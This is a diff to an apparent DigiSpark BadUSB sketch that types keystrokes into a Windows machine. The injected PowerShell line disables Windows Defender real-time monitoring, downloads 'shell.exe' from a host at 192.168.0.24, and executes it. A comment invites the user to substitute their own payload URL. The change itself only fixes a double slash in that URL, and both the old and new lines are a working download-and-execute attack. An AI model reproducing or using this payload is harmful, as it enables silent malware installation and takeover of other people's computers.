@@ -14,8 +14,8 @@ void loop() {
   DigiKeyboard.delay(2500);
   DigiKeyboard.sendKeyStroke(KEY_Y,MOD_ALT_LEFT);
   DigiKeyboard.delay(1000);
-  // change 'http://192.168.0.24//shell.exe' to wherever you wish to download your executable from
-  DigiKeyboard.print("Set-MpPreference -DisableRea $true;$d = New-Object System.Net.WebClient;$f = '1.exe';$d.DownloadFile('http://192.168.0.24//shell.exe',$f);$e = New-Object -com shell.application; $e.shellexecute($f);");
+  // change 'http://192.168.0.24/shell.exe' to wherever you wish to download your executable from
+  DigiKeyboard.print("Set-MpPreference -DisableRea $true;$d = New-Object System.Net.WebClient;$f = '1.exe';$d.DownloadFile('http://192.168.0.24/shell.exe',$f);$e = New-Object -com shell.application; $e.shellexecute($f);");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(500);
   ExitShell();
